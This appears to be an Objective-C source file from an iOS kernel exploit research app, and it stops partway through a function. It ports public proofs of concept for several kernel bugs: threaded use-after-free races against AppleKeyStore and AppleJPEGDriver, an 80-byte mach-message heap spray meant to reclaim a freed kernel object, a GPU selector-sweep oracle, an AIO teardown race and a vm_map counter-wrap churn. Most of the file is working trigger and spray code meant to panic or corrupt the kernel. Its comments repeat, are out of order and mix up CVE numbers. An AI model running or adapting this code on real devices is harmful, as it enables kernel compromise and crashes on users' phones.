// ---------------------------------------------------------------------------
// NewProbes.m - two measurement probes for the only root-class applicable CVE
// and the only A14-tested public kernel PoC:
//
//  ModIOGPUUAFOracle  (CVE-2026-64788, PoC: ByteV0rtex, TESTED ON A14)
//    IOGPUDevice::create_resource_iosurface leaves a stale resource-table
//    entry when a packed dimension overflow (1x65535) takes the error path.
//    The PoC's oracle: set_resource_purgeable on the stale id returns
//    0xe00002be (stale entry processed) instead of 0xe00002c2 (not found).
//    This module: (1) drives the overflow path with IOSurfaces + Metal
//    textures, (2) finds the accelerator user client, (3) sweeps its
//    selectors and logs every return code - the measurement itself.  It does
//    NOT write anything and does NOT chain anything.
//
//  ModVmMapWrap  (CVE-2025-46285, the only root-class CVE)
//    xnu-12377.60.50 keeps struct vm_map.timestamp as a 32-bit version
//    counter (fixed to uint64_t in 26.2).  Every entry insert/remove in one
//    map increments it; a wrap lets a saved version collide with a re-read
//    version (TOCTOU).  This module measures the increment rate on THIS
//    device and projects the time to 2^32 on a single map - the precondition.
//    It churns one map (mmap/munmap pairs in the same range), logs the rate,
//    and is resumable across launches via the forensic file.
// ---------------------------------------------------------------------------
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <mach/mach.h>
#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#import <malloc/malloc.h>
#import <sys/mman.h>
#import <unistd.h>
#import <stdio.h>
#import <time.h>
#import <errno.h>
#import <string.h>
#import <objc/runtime.h>

#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// Metal is linked in build.sh, but the SDK's Metal umbrella does not expose
// its types to this translation unit (measured on the CI toolchain: MTLDevice
// undeclared despite -framework Metal, and a hand-declared @protocol did not
// satisfy the compiler either).  So: plain id + the REAL selector names
// declared on NSObject (a category), and the class fetched at runtime.  The
// signatures match the runtime (note the lowercase "iosurface:", exactly as
// the CI compiler suggested).
extern id MTLCreateSystemDefaultDevice(void);

@interface NSObject (RSMetalNames)
+ (instancetype)texture2DDescriptorWithPixelFormat:(NSUInteger)pixelFormat
                                            width:(NSUInteger)width
                                           height:(NSUInteger)height
                                        mipmapped:(BOOL)mipmapped;
- (id)newTextureWithDescriptor:(id)descriptor
                     iosurface:(struct __IOSurface *)iosurface
                         plane:(NSUInteger)plane;
- (void)setUsage:(NSUInteger)usage;
@end

#define RS_MTL_PIXEL_BGRA8UNORM 80
#define RS_MTL_USAGE_SHADERREAD 1

// IOSurface: not importable from the plain iOS SDK
typedef struct __IOSurface *IOSurfaceRef_;
extern IOSurfaceRef_ IOSurfaceCreate(CFDictionaryRef dictionary);
extern uint32_t IOSurfaceGetID(IOSurfaceRef_ buffer);
extern void IOSurfaceSetValue(IOSurfaceRef_, CFStringRef, CFTypeRef);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef_ buffer);
extern int IOSurfaceLock(IOSurfaceRef_, uint32_t, uint32_t *);
extern int IOSurfaceUnlock(IOSurfaceRef_, uint32_t, uint32_t *);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef_);
#define kIOSurfaceWidth  CFSTR("IOSurfaceWidth")
#define kIOSurfaceHeight CFSTR("IOSurfaceHeight")
#define kIOSurfaceBytesPerElement CFSTR("IOSurfaceBytesPerElement")
#define kIOSurfaceBytesPerRow CFSTR("IOSurfaceBytesPerRow")
#define kIOSurfacePixelFormat CFSTR("IOSurfacePixelFormat")

static volatile io_connect_t g_aks_conn = 0;
static volatile int g_aks_done = 0;
static volatile int g_aks_calls = 0;
static volatile int g_aks_closes = 0;
static volatile int g_aks_opens = 0;

// ===========================================================================
// 6. CVE-2026-20637 + RECLAIM: the confirmed UAF, now with a kalloc.80 spray
//    The 25.11 device panic PROVED the UAF: "[iokit.IOCommandGate]: element
//    modified after free (off:72, val:0xffffffffffffff00, sz:80, ...)" - the
//    kernel reads and writes a FREED 80-byte gate element.  sz=80 means the
//    element lives in kalloc.80, so a tight send/receive loop of 80-byte mach
//    messages filled with our canary churns that zone with our data: if the
//    panic value ever shows 0xC0FFEE5A... instead of 0xffffffffffffff00, the
//    freed element was reclaimed by our spray = a controlled gate element.
// ===========================================================================
static volatile int g_spray_run = 0;
static volatile int g_spray_n = 0;
static mach_port_t g_spray_port = MACH_PORT_NULL;

static void *rs_spray80(void *arg) {
    (void)arg;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_TYPE_RECEIVE, &g_spray_port) != KERN_SUCCESS)
        return NULL;
    mach_port_insert_right(mach_task_self(), g_spray_port, g_spray_port, MACH_MSG_TYPE_MAKE_SEND);
    while (g_spray_run) {
        // exactly 80 bytes: 24-byte header + 56-byte canary body -> kalloc.80
        struct { mach_msg_header_t h; unsigned char body[56]; } m;
        memset(&m, 0, sizeof m);
        m.h.msgh_size = sizeof m;
        m.h.msgh_local_port = g_spray_port;
        for (int k = 0; k < 56; k += 8) {
            uint64_t v = 0xC0FFEE5A00000000ull | (uint64_t)k;
            memcpy(m.body + k, &v, 8);
        }
        // send to ourselves and immediately receive: the kernel allocates
        // 80 bytes, copies our canary in, then frees it - a tight zone churn
        kern_return_t kr = mach_msg(&m.h, MACH_SEND_MSG | MACH_RCV_MSG,
                                    m.h.msgh_size, m.h.msgh_size, g_spray_port,
                                    MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (kr == KERN_SUCCESS) __sync_fetch_and_add(&g_spray_n, 1);
        else break;
    }
    return NULL;
}

NSString *ModAksReclaim(void) {
    AveLog(@"[aks-reclaim] === 20637 UAF + kalloc.80 canary reclaim ===");
    g_aks_conn = 0; g_aks_done = 0; g_aks_calls = 0; g_aks_closes = 0; g_aks_opens = 0;
    g_spray_run = 0; g_spray_n = 0;

    CFMutableDictionaryRef m = IOServiceMatching("AppleKeyStore");
    if (!m) return @"AppleKeyStore: no matching dictionary";
    io_iterator_t it = 0;
    if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it)
        return @"AppleKeyStore: service not found";
    io_service_t svc = IOIteratorNext(it);
    IOObjectRelease(it);
    if (!svc) return @"AppleKeyStore: no service instance";

    // the reclaim spray: 80-byte canary messages churning kalloc.80
    g_spray_run = 1;
    pthread_t sp;
    if (pthread_create(&sp, NULL, rs_spray80, NULL) == 0)
        AveLog(@"[aks-reclaim] spray thread up (80-byte canary messages)");
    else
        AveLog(@"[aks-reclaim] spray thread FAILED to start");

    // 8 callers + 4 closers (the confirmed race)
    for (int t = 0; t < 8; t++) {
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
            while (!g_aks_done) {
                io_connect_t c = g_aks_conn;
                if (!c) continue;
                for (uint32_t sel = 0; sel < 16; sel++) {
                    uint64_t sc[6] = {1, 2, 3, 4, 5, 6};
                    IOConnectCallMethod(c, sel, sc, 6, NULL, 0, NULL, NULL, NULL, NULL);
                    __sync_fetch_and_add(&g_aks_calls, 1);
                }
            }
        });
    }
    for (int t = 0; t < 4; t++) {
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
            while (!g_aks_done) {
                io_connect_t c = g_aks_conn;
                if (!c) continue;
                IOServiceClose(c);
                __sync_fetch_and_add(&g_aks_closes, 1);
                g_aks_conn = 0;
            }
        });
    }
    // main: the open churn that keeps the race window hot
    const uint32_t types[4] = {0x2022, 0xbeef, 0x1337, 0x4141};
    const int N = 60000;
    for (int i = 0; i < N; i++) {
        io_connect_t conn = 0;
        if (IOServiceOpen(svc, mach_task_self(), types[i % 4], &conn) == KERN_SUCCESS && conn) {
            g_aks_conn = conn;
            __sync_fetch_and_add(&g_aks_opens, 1);
        }
        if ((i & 0x3FFF) == 0x3FFF)
            AveLog(S(@"[aks-reclaim] %d/%d opens (calls=%d closes=%d spray=%d)",
                     i, N, g_aks_calls, g_aks_closes, g_spray_n));
    }
    g_aks_done = 1; g_spray_run = 0;
    usleep(200000);
    if (g_aks_conn) { IOServiceClose(g_aks_conn); g_aks_conn = 0; }
    IOObjectRelease(svc);
    AveLog(S(@"[aks-reclaim] done: opens=%d calls=%d closes=%d spray=%d",
             g_aks_opens, g_aks_calls, g_aks_closes, g_spray_n));
    AveLog(@"[aks-reclaim] a panic showing 0xC0FFEE5A... = the freed gate element is OURS");
    AveSetStatus(@"reclaim run done - see the log");
    return S(@"reclaim: %d opens, %d spray messages; a panic with our canary = controlled element",
              g_aks_opens, g_spray_n);
}
//    Public PoC: github.com/zeroxjf/CVE-2026-20687-AppleSEPKeyStore-UAF
//    "Target Versions: iOS 26.1 - 26.2 (TESTED)" - our exact build (23C5027f),
//    fixed in 26.3.  Apple: "An app may be able to cause unexpected system
//    termination" (use after free).  The PoC immediately kernel-panics
//    affected devices.
//    Shape: 8 caller threads hammer IOConnectCallMethod on selectors 0-15
//    while 4 closer threads race IOServiceClose; the main thread opens 100k
//    connections with rotating types (0x2022/0xbeef/0x1337/0x4141) and NO
//    delay, keeping the close/call race window hot.  The panic is
//    "[iokit.IOCommandGate]: element modified after free" (a freed 80-byte
//    gate element at offset 72).
// ===========================================================================
// ===========================================================================
// 5. CVE-2026-20637 port: AppleSEPKeyStore IOCommandGate UAF
//    Public PoC: github.com/zeroxjf/CVE-2026-20687-AppleSEPKeyStore-UAF
//    "Target Versions: iOS 26.1 - 26.2 (TESTED)" - our exact build (23C5027f),
//    fixed in 26.3.  CONFIRMED ON DEVICE 25.11: "[iokit.IOCommandGate]:
//    element modified after free (off:72, val:0xffffffffffffff00, sz:80)".
//    Shape: 8 caller threads hammer IOConnectCallMethod on selectors 0-15
//    while 4 closer threads race IOServiceClose; the main thread opens 100k
//    connections with rotating types (0x2022/0xbeef/0x1337/0x4141) and NO
//    delay, keeping the close/call race window hot.
// ===========================================================================

NSString *ModAksUAF(void) {
    AveLog(@"[aks20637] === CVE-2026-20637: AppleSEPKeyStore IOCommandGate UAF (public PoC, TESTED on 26.1-26.2) ===");
    g_aks_conn = 0; g_aks_done = 0; g_aks_calls = 0; g_aks_closes = 0; g_aks_opens = 0;

    CFMutableDictionaryRef m = IOServiceMatching("AppleKeyStore");
    if (!m) return @"AppleKeyStore: no matching dictionary";
    io_iterator_t it = 0;
    if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it)
        return @"AppleKeyStore: service not found";
    io_service_t svc = IOIteratorNext(it);
    IOObjectRelease(it);
    if (!svc) return @"AppleKeyStore: no service instance";

    // 8 caller threads: hammer selectors 0-15 on the live connection
    for (int t = 0; t < 8; t++) {
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
            while (!g_aks_done) {
                io_connect_t c = g_aks_conn;
                if (!c) continue;
                for (uint32_t sel = 0; sel < 16; sel++) {
                    uint64_t sc[6] = {1, 2, 3, 4, 5, 6};
                    IOConnectCallMethod(c, sel, sc, 6, NULL, 0, NULL, NULL, NULL, NULL);
                    __sync_fetch_and_add(&g_aks_calls, 1);
                }
            }
        });
    }
    // 4 closer threads: race IOServiceClose
    for (int t = 0; t < 4; t++) {
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
            while (!g_aks_done) {
                io_connect_t c = g_aks_conn;
                if (!c) continue;
                IOServiceClose(c);
                __sync_fetch_and_add(&g_aks_closes, 1);
                g_aks_conn = 0;
            }
        });
    }
    // main: 100k connections, rotating types, no delay (the hot race window)
    const uint32_t types[4] = {0x2022, 0xbeef, 0x1337, 0x4141};
    const int N = 100000;
    for (int i = 0; i < N; i++) {
        io_connect_t conn = 0;
        if (IOServiceOpen(svc, mach_task_self(), types[i % 4], &conn) == KERN_SUCCESS && conn) {
            g_aks_conn = conn;
            __sync_fetch_and_add(&g_aks_opens, 1);
        }
        if ((i & 0x3FFF) == 0x3FFF)
            AveLog(S(@"[aks20637] %d/%d opens (calls=%d closes=%d)", i, N, g_aks_calls, g_aks_closes));
    }
    g_aks_done = 1;
    usleep(200000);
    if (g_aks_conn) { IOServiceClose(g_aks_conn); g_aks_conn = 0; }
    IOObjectRelease(svc);
    AveLog(S(@"[aks20637] done: opens=%d calls=%d closes=%d (a panic = the IOCommandGate UAF fired)",
             g_aks_opens, g_aks_calls, g_aks_closes));
    AveSetStatus(@"20637 trigger done - see the log");
    return S(@"20637: %d opens, %d calls, %d closes; a panic = the IOCommandGate UAF fired",
              g_aks_opens, g_aks_calls, g_aks_closes);
}
//    Public PoC: github.com/0xjohnnydev/CVE-2026-20687-AppleJPEGDriver-UAF
//    (validated by Mallory; tested on A19 / iOS 26.3).  FIXED IN 26.4 - our
//    23C5027f (26.2b1) is VULNERABLE.  Apple's own text: "An app may be able
//    to cause unexpected system termination or WRITE KERNEL MEMORY".
//
//    Shape (from the PoC's disassembly notes):
//      selector 1 = decode, structIn = structOut = 0x58 (AppleJPEGDriverIOStruct)
//      asyncToken != 0  => async mode => the request node (req+0x78) is pushed
//      into the per-codec vector at driver self+192; closing the client with
//      requests in flight frees the JpegRequest (0x440 bytes) WITHOUT
//      dequeuing; a later queue walk (finish_io_gated -> fullSpeedRequestExist)
//      reads the stale node: req2 = *(node+8) -> UAF.  req+0x00 is a task_t,
//      so a vtable-style deref of it is PC control.
//    This module drives exactly that shape (8 threads x iters x 10 async
//    requests, close under flight) and reports the wired-memory delta and
//    every return code.  The deferred panic usually needs one sync decode
//    afterwards (the PoC uses the Camera app).
// ===========================================================================
// ===========================================================================
// 4. CVE-2026-20687 port: AppleJPEGDriver startDecoder() timeout UAF
//    Public PoC: github.com/0xjohnnydev/CVE-2026-20687-AppleJPEGDriver-UAF
//    (validated by Mallory; tested on A19 / iOS 26.3).  FIXED IN 26.4 - our
//    23C5027f (26.2b1) is VULNERABLE.  Apple's own text: "An app may be able
//    to cause unexpected system termination or WRITE KERNEL MEMORY".
//    Shape: selector 1 = decode, structIn = structOut = 0x58; asyncToken != 0
//    pushes the request node (req+0x78) into the per-codec vector; closing
//    the client with requests in flight frees the JpegRequest (0x440 bytes)
//    WITHOUT dequeuing; a later queue walk reads the stale node (req+0x80)
//    -> UAF.  req+0x00 is a task_t, so a vtable-style deref is PC control.
// ===========================================================================
typedef struct __attribute__((packed)) {
    uint32_t sourceID;      // +0x00 source IOSurface id (JPEG bytes)
    uint32_t field_04;      // +0x04 input size
    uint32_t destID;        // +0x08 dest IOSurface id
    uint32_t field_0C;      // +0x0C output size
    uint32_t field_10;      // +0x10
    uint32_t width;         // +0x14
    uint32_t height;        // +0x18
    uint32_t field_1C;      // +0x1C
    uint8_t  flags;         // +0x20 bit0=progressive
    uint8_t  pad_21[3];
    uint32_t xOffset;       // +0x24
    uint32_t yOffset;       // +0x28
    uint32_t subsampling;   // +0x2C
    uint64_t asyncToken;    // +0x30 non-zero = ASYNC (the UAF window)
    uint64_t asyncToken2;   // +0x38
    uint64_t field_40;      // +0x40
    uint32_t codecID;       // +0x48
    uint32_t outWidth;      // +0x4C
    uint32_t outHeight;     // +0x50
    uint32_t field_54;      // +0x54
} RSJpegIn;

static io_service_t rs_jpeg_service(void) {
    CFMutableDictionaryRef m = IOServiceMatching("AppleJPEGDriver");
    if (!m) return 0;
    io_iterator_t it = 0;
    if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it) return 0;
    io_service_t s = IOIteratorNext(it);
    IOObjectRelease(it);
    return s;
}

static int64_t rs_wired_pages(void) {
    host_name_port_t host = mach_host_self();
    vm_statistics64_data_t vm;
    mach_msg_type_number_t n = HOST_VM_INFO64_COUNT;
    if (host_statistics64(host, HOST_VM_INFO64, (host_info64_t)&vm, &n) != KERN_SUCCESS) return -1;
    return (int64_t)vm.wire_count;
}

NSString *ModJpegUAF(void) {
    AveLog(@"[jpeg20687] === CVE-2026-20687: AppleJPEGDriver startDecoder timeout UAF (public PoC port) ===");
    io_service_t svc = rs_jpeg_service();
    if (!svc) return @"AppleJPEGDriver: service not found";

    // a real JPEG (the driver wants plausible input)
    const int W = 1024, H = 1024;
    UIGraphicsBeginImageContext(CGSizeMake(W, H));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, W, H));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
    if (!jpeg) { IOObjectRelease(svc); return @"jpeg encode failed"; }

    // source surface: raw bytes, page-aligned
    size_t allocLen = (jpeg.length + 0x3FFF) & ~(size_t)0x3FFF;
    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
    if (!src || !dst) {
        if (src) CFRelease(src);
        if (dst) CFRelease(dst);
        IOObjectRelease(svc);
        return @"surface creation failed";
    }
    IOSurfaceLock(src, 0, NULL);
    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(src, 0, NULL);
    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
    AveLog(S(@"[jpeg20687] src=%u dst=%u jpeg=%zuB %dx%d", srcID, dstID, jpeg.length, W, H));

    int64_t wired0 = rs_wired_pages();
    AveLog(S(@"[jpeg20687] wired before: %lld pages", wired0));

    // 8 threads x iters x 10 async requests, close under flight
    const int THREADS = 8, REQS = 10, ITERS = 40;
    __block volatile int32_t totalSubmitted = 0, totalConn = 0;
    __block kern_return_t lastKR = 0;
    dispatch_group_t group = dispatch_group_create();
    for (int t = 0; t < THREADS; t++) {
        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            for (int i = 0; i < ITERS; i++) {
                io_connect_t conn = 0;
                if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != KERN_SUCCESS || !conn) continue;
                int submitted = 0;
                for (int j = 0; j < REQS; j++) {
                    RSJpegIn in; memset(&in, 0, sizeof in);
                    in.sourceID = srcID; in.destID = dstID;
                    in.field_04 = (uint32_t)jpeg.length; in.field_0C = W * H * 4;
                    in.width = W; in.height = H; in.outWidth = W; in.outHeight = H;
                    in.subsampling = 3;
                    in.asyncToken = 0x4141 + j;      // non-zero = async mode
                    RSJpegIn out; memset(&out, 0, sizeof out);
                    size_t outSz = sizeof out;
                    kern_return_t kr = IOConnectCallStructMethod(conn, 1, &in, sizeof in,
                                                                &out, &outSz);
                    lastKR = kr;
                    if (kr != KERN_SUCCESS) break;
                    submitted++;
                }
                IOServiceClose(conn);                // close with requests in flight
                __sync_fetch_and_add(&totalSubmitted, submitted);
                __sync_fetch_and_add(&totalConn, 1);
            }
        });
    }
    dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
    usleep(500000);

    int64_t wired1 = rs_wired_pages();
    AveLog(S(@"[jpeg20687] connections=%d submitted=%d lastKR=%#x", totalConn, totalSubmitted, lastKR));
    AveLog(S(@"[jpeg20687] wired delta: %+lld pages (the JpegRequest leak)", wired1 - wired0));
    AveLog(@"[jpeg20687] deferred panic: run one SYNC decode now (open Camera or decode a JPEG)");

    CFRelease(src); CFRelease(dst); IOObjectRelease(svc);
    AveSetStatus(@"20687 trigger done - see the log");
    return S(@"20687: %d conns, %d async decodes, wired %+lld pages; a sync decode next = the deferred panic",
              totalConn, totalSubmitted, wired1 - wired0);
}

// ===========================================================================
// 1. CVE-2026-64788 oracle
// ===========================================================================
NSString *ModIOGPUUAFOracle(void) {
    id dev = nil;      // declared at function scope (mid-block decls trip the CI parser)
    id tex = nil;
    id td = nil;
    AveLog(@"[gpu64788] === CVE-2026-64788 oracle: overflow IOSurface -> stale GPU resource entry ===");

    // ---- (1) find an accelerator / GPU user client ----
    const char *cls[] = { "AGXAcceleratorG13P", "AGXAcceleratorG17P",
                          "IOGPUDevice", "IOGPUFamily", NULL };
    io_connect_t gpu = 0;
    const char *who = NULL;
    for (int i = 0; cls[i]; i++) {
        CFMutableDictionaryRef m = IOServiceMatching(cls[i]);
        if (!m) continue;
        io_service_t d = IOServiceGetMatchingService(kIOMainPortDefault, m);
        if (!d) continue;
        io_connect_t c = 0;
        kern_return_t kr = IOServiceOpen(d, mach_task_self(), 0, &c);
        IOObjectRelease(d);
        AveLog(S(@"    class %-18s -> open %#x", cls[i], kr));
        if (kr == KERN_SUCCESS && c) {
            if (gpu) IOServiceClose(gpu);
            gpu = c; who = cls[i];
        }
    }
    if (!gpu) {
        AveLog(@"[gpu64788] no accelerator user client openable - the Metal path may still reach it via the GPU daemon");
    } else {
        AveLog(S(@"[gpu64788] accelerator client: %s", who));
    }

    // ---- (2) drive the overflow path: 1x65535 packed dimensions ----
    int made = 0;
    struct { uint32_t w, h; const char *tag; } O[] = {
        {1, 65535, "1x65535 (packed overflow)"},
        {65535, 1, "65535x1"},
        {1, 65536, "1x65536"},
        {8192, 8192, "8192x8192 (control)"},
    };
    for (unsigned i = 0; i < sizeof(O)/sizeof(O[0]); i++) {
        @autoreleasepool {
            NSDictionary *d = @{(id)kIOSurfaceWidth: @(O[i].w),
                                (id)kIOSurfaceHeight: @(O[i].h),
                                (id)kIOSurfaceBytesPerElement: @(4)};
            IOSurfaceRef_ s = IOSurfaceCreate((__bridge CFDictionaryRef)d);
            if (!s) { AveLog(S(@"    surface %-24s -> create FAILED", O[i].tag)); continue; }
            uint32_t id = IOSurfaceGetID(s);
            AveLog(S(@"    surface %-24s -> id=%u alloc=%zu", O[i].tag, id, IOSurfaceGetAllocSize(s)));
            made++;
            // The trigger: a Metal texture over the overflow surface is how the
            // public PoC reaches IOGPUDevice::create_resource_iosurface.
            @try {
                dev = MTLCreateSystemDefaultDevice();
                if (dev) {
                    Class tdCls = objc_getClass("MTLTextureDescriptor");
                    td = [tdCls texture2DDescriptorWithPixelFormat:RS_MTL_PIXEL_BGRA8UNORM
                                                             width:O[i].w height:O[i].h mipmapped:NO];
                    [td setUsage:RS_MTL_USAGE_SHADERREAD];
                    tex = [dev newTextureWithDescriptor:td
                                              iosurface:(struct __IOSurface *)s
                                                  plane:0];
                    AveLog(S(@"    texture %-24s -> %s", O[i].tag, tex ? "created" : "nil"));
                } else {
                    AveLog(S(@"    texture %-24s -> no MTLDevice", O[i].tag));
                }
            } @catch (NSException *e) {
                AveLog(S(@"    texture %-24s -> threw %@", O[i].tag, e.reason));
            }
            CFRelease(s);
        }
    }
    AveLog(S(@"[gpu64788] %d/4 overflow surfaces created", made));

    // ---- (2b) AFTER the textures exist, retry the GPU classes with every
    // connection type (the GPU daemon sets up the accelerators on first use) ----
    if (!gpu) {
        for (int i = 0; cls[i]; i++) {
            for (uint32_t t = 0; t < 4; t++) {
                CFMutableDictionaryRef m = IOServiceMatching(cls[i]);
                if (!m) continue;
                io_service_t d = IOServiceGetMatchingService(kIOMainPortDefault, m);
                if (!d) continue;
                io_connect_t c = 0;
                kern_return_t kr = IOServiceOpen(d, mach_task_self(), t, &c);
                IOObjectRelease(d);
                if (kr == KERN_SUCCESS && c) {
                    AveLog(S(@"    class %-18s type %u -> OPEN", cls[i], t));
                    gpu = c; who = cls[i];
                    break;
                }
            }
            if (gpu) break;
        }
    }

    // ---- (3) sweep the accelerator selectors, log every code ----
    // The PoC's oracle codes: 0xe00002c2 (resource not found) vs
    // 0xe00002be (stale entry processed with our spray data).
    if (gpu) {
        AveLog(@"[gpu64788] selector sweep on the accelerator client:");
        for (uint32_t sel = 0; sel < 40; sel++) {
            uint64_t in[4] = {1, 0, 0, 0};
            uint64_t out[4] = {0, 0, 0, 0};
            size_t outSz = sizeof(out);
            kern_return_t r = IOConnectCallMethod(gpu, sel, in, 4, NULL, 0,
                                                  out, &outSz, NULL, NULL);
            if (r != (kern_return_t)0xe00002c2 && r != KERN_SUCCESS)
                AveLog(S(@"    sel %-3u -> %#x", sel, r));
            else
                AveLog(S(@"    sel %-3u -> %#x", sel, r));
            if (r == (kern_return_t)0xe00002c2 || r == (kern_return_t)0xe00002be)
                AveLog(S(@"    sel %-3u -> ORACLE CODE %#x (%s)", sel, r,
                         r == (kern_return_t)0xe00002be ? @"STALE ENTRY PROCESSED" : @"not found"));
        }
        IOServiceClose(gpu);
    }
    AveSetStatus(@"64788 oracle done - see the log");
    return @"64788 oracle: overflow surfaces + selector sweep logged (no writes, no chain)";
}

// ===========================================================================
// 3. Family B reproducer: the aio_workq_entry UAF (48 panics, pc+0x4cff40)
//    The second panic family (48 of the 60 device panics, never analysed
//    before) faults in lck_mtx_lock fast path on a lock at [obj+0x58] of a
//    FREED object; the neighbourhood strings are kern_aio.c, lio_listio,
//    kern_descrip.c and the XNU panic "aio_workq_entry %p being freed while
//    still enqueued" - i.e. the AIO work-queue entry teardown.  This module
//    drives exactly that shape: submit POSIX AIO reads, then tear the
//    descriptors down under them (close + aio_cancel) so completions and
//    teardown race, in a loop.  A panic is the reproduction.
// ===========================================================================
#import <aio.h>

NSString *ModAioRace(void) {
    AveLog(@"[aio] === family B reproducer: aio_workq_entry teardown race (48 panics) ===");
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                            NSUserDomainMask, YES) firstObject];
    NSString *path = [docs stringByAppendingPathComponent:@"aio_race_file"];
    const char *cpath = path.UTF8String;

    int panics_expected = 0;
    for (int round = 0; round < 24; round++) {
        @autoreleasepool {
            // a fresh file with real content every round
            int wfd = open(cpath, O_RDWR | O_CREAT | O_TRUNC, 0600);
            if (wfd < 0) { AveLog(S(@"[aio] round %d: create failed %d", round, errno)); continue; }
            char buf[4096];
            memset(buf, 0x41, sizeof buf);
            for (int i = 0; i < 8; i++) if (write(wfd, buf, sizeof buf) != (ssize_t)sizeof buf) break;
            fsync(wfd);
            lseek(wfd, 0, SEEK_SET);

            // submit AIO reads on it (4 at a time: the per-process queue is small and
            // EAGAINs once it saturates - measured: 16-at-a-time filled it forever)
            enum { N = 4 };
            struct aiocb cb[N];
            char *rbuf[N];
            int queued = 0;
            for (int i = 0; i < N; i++) {
                rbuf[i] = malloc(2048);
                memset(&cb[i], 0, sizeof cb[i]);
                cb[i].aio_fildes = wfd;
                cb[i].aio_buf = rbuf[i];
                cb[i].aio_nbytes = 2048;
                cb[i].aio_offset = (off_t)(i * 2048);
                cb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
                if (aio_read(&cb[i]) == 0) queued++;
                else AveLog(S(@"[aio] round %d: aio_read %d -> %d (not queued)", round, i, errno));
            }
            // tear the descriptor down under the in-flight requests
            aio_cancel(wfd, NULL);   // NULL = cancel every outstanding request on this fd
            close(wfd);
            // DRAIN: reap the entries (aio_return/aio_suspend) so the queue never
            // saturates - without this the per-process AIO queue stays full and
            // every later aio_read fails EAGAIN, which is exactly what happened
            // on the first device run (35 = EAGAIN on all 16).
            const struct aiocb *waitList[N];
            for (int i = 0; i < N; i++) waitList[i] = &cb[i];
            aio_suspend((void *)waitList, N, NULL);
            for (int i = 0; i < N; i++) { ssize_t r = aio_return((struct aiocb *)&cb[i]); (void)r; }
            // let the completions/teardown run
            usleep(30000);
            for (int i = 0; i < N; i++) {
                if (rbuf[i]) { volatile char c = rbuf[i][0]; (void)c; free(rbuf[i]); }
            }
            unlink(cpath);
            panics_expected++;
            if ((round & 7) == 7)
                AveLog(S(@"[aio] %d rounds of AIO teardown churn done (last round queued %d/4)", round + 1, queued));
        }
    }
    AveSetStatus(@"aio race churn done");
    return S(@"aio teardown churn: %d rounds (submit + drain + close + cancel); a panic = family B reproduced", panics_expected);
}
static long long rs_vmwrap_read(void) {
    FILE *f = fopen([[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                         NSUserDomainMask, YES) firstObject]
                         stringByAppendingPathComponent:@"rs112477.log"] UTF8String], "r");
    if (!f) return 0;
    char line[256];
    long long v = 0;
    while (fgets(line, sizeof line, f))
        if (sscanf(line, "VMWRAP ops=%lld", &v) == 2) { /* keep last */ }
    fclose(f);
    return v;
}

static void rs_vmwrap_save(long long ops) {
    NSString *p = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                     NSUserDomainMask, YES) firstObject]
                     stringByAppendingPathComponent:@"rs112477.log"];
    FILE *f = fopen(p.UTF8String, "a");
    if (f) { fprintf(f, "VMWRAP ops=%lld\n", ops); fflush(f); fclose(f); }
}

NSString *ModVmMapWrap(void) {
    // The device measurement (24.11): 4.05 Mops/s on one map -> 2^32 wraps in
    // ~17.7 minutes.  So this now runs until the accumulated counter reaches
    // the wrap (resumable across launches via VMWRAP in the forensic file),
    // with a hard time cap.  Anything that breaks during the wrap is the
    // CVE-2025-46285 precondition firing.
    const long long kTarget = 4294967296LL + 1048576LL;   // 2^32 + margin
    const double kTimeCapSecs = 1500.0;                   // 25 min per launch
    long long done0 = rs_vmwrap_read();
    AveLog(@"[vmwrap] === CVE-2025-46285: vm_map timestamp (32-bit version counter) wrap measurement ===");
    AveLog(S(@"[vmwrap] previous launches: %lld ops", done0));

    const size_t kPage = 4096;
    void *base = mmap(NULL, kPage * 4, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED) return @"vmwrap: mmap failed";

    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    long long n = 0;
    int first_errno = 0;
    for (long long i = 0; ; i++) {
        // each pair = one entry insert + one remove in the SAME map
        // (plain mmap/munmap: every insert/remove bumps map->timestamp)
